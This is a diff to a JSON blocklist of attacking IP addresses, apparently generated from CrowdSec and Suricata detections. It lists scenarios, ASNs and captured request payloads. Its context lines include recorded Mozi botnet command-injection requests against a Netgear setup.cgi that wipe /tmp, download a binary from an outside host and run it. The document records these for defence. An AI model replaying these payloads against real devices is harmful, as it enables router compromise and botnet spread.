@@ -1,10 +1,10 @@
 {
-  "generated_at": "2026-04-28T15:00:00Z",
+  "generated_at": "2026-04-29T01:00:00Z",
   "ttl_days": 7,
   "scope": "crowdsec",
   "counts": {
-    "total": 22,
-    "v4": 22,
+    "total": 26,
+    "v4": 26,
     "v6": 0
   },
   "items": [
@@ -28,43 +28,6 @@
       "payloads": [
         "POST /"
       ]
-    },
-    {
-      "ip": "4.223.161.209",
-      "family": "v4",
-      "first_seen": "2026-04-22T00:00:00Z",
-      "last_seen": "2026-04-22T00:00:00Z",
-      "scenarios": [
-        "crowdsec/http-admin-interface-probing",
-        "crowdsec/http-backdoors-attempts",
-        "crowdsec/http-crawl-non_statics",
-        "crowdsec/http-probing",
-        "crowdsec/http-wordpress-scan"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "8075",
-      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
-      "asn_prefix": "4.208.0.0/12",
-      "tags": [
-        "mwl:cloud=\"azure\""
-      ]
-    },
-    {
-      "ip": "8.209.96.179",
-      "family": "v4",
-      "first_seen": "2026-04-21T23:00:00Z",
-      "last_seen": "2026-04-21T23:00:00Z",
-      "scenarios": [
-        "crowdsec/http-probing"
-      ],
-      "sources": [
-        "crowdsec"
-      ],
-      "asn": "45102",
-      "asn_name": "ALIBABA-CN-NET Alibaba US Technology Co.",
-      "asn_prefix": "8.209.96.0/19"
     },
     {
       "ip": "20.216.170.198",
@@ -477,6 +440,141 @@
       "payloads": [
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*&wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear&sh+netgear&curpath=/&currentsetting.htm=1",
         "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://103.173.7.167:33639/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1"
+      ]
+    },
+    {
+      "ip": "47.91.125.252",
+      "family": "v4",
+      "first_seen": "2026-04-28T23:00:00Z",
+      "last_seen": "2026-04-28T23:00:00Z",
+      "scenarios": [
+        "crowdsec/http-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "payloads": [
+        "GET /dns-query?dns=-M4BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
+        "POST /dns-query",
+        "GET /dns-query?name=1.odns.m.dnsmeasure.top&type=A",
+        "GET /dns-query?dns=y98BAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
+        "GET /query?dns=g7cBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
+        "POST /query",
+        "GET /query?name=1.odns.m.dnsmeasure.top&type=A",
+        "GET /query?dns=j5cBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
+        "GET /resolve?dns=iYYBAAABAAAAAAAAATEEb2RucwFtCmRuc21lYXN1cmUDdG9wAAABAAE",
+        "POST /resolve",
+        "GET /resolve?name=1.odns.m.dnsmeasure.top&type=A"
+      ]
+    },
+    {
+      "ip": "199.45.155.108",
+      "family": "v4",
+      "first_seen": "2026-04-28T21:00:00Z",
+      "last_seen": "2026-04-28T21:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398722",
+      "asn_name": "CENSYS-ARIN-03 - Censys",
+      "asn_prefix": "199.45.155.0/24",
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "20.64.105.121",
+      "family": "v4",
+      "first_seen": "2026-04-28T20:00:00Z",
+      "last_seen": "2026-04-28T20:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing",
+        "suricata/ET SCAN Zmap User-Agent (Inbound)"
+      ],
+      "sources": [
+        "crowdsec",
+        "suricata"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.64.0.0/10",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /developmentserver/metadatauploader"
+      ]
+    },
+    {
+      "ip": "199.45.154.128",
+      "family": "v4",
+      "first_seen": "2026-04-28T19:00:00Z",
+      "last_seen": "2026-04-28T19:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398722",
+      "asn_name": "CENSYS-ARIN-03 - Censys",
+      "asn_prefix": "199.45.154.0/24",
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "199.45.154.155",
+      "family": "v4",
+      "first_seen": "2026-04-28T19:00:00Z",
+      "last_seen": "2026-04-28T19:00:00Z",
+      "scenarios": [
+        "crowdsec/http-bad-user-agent"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "398722",
+      "asn_name": "CENSYS-ARIN-03 - Censys",
+      "asn_prefix": "199.45.154.0/24",
+      "tags": [
+        "mwl:scanner=\"censys\""
+      ],
+      "payloads": [
+        "GET /",
+        "GET /debug/pprof/"
+      ]
+    },
+    {
+      "ip": "20.163.34.54",
+      "family": "v4",
+      "first_seen": "2026-04-28T15:00:00Z",
+      "last_seen": "2026-04-28T15:00:00Z",
+      "scenarios": [
+        "crowdsec/http-cve-probing"
+      ],
+      "sources": [
+        "crowdsec"
+      ],
+      "asn": "8075",
+      "asn_name": "MICROSOFT-CORP-MSN-AS-BLOCK - Microsoft Corporation",
+      "asn_prefix": "20.160.0.0/12",
+      "tags": [
+        "mwl:cloud=\"azure\""
+      ],
+      "payloads": [
+        "GET /developmentserver/metadatauploader"
       ]
     }
   ]
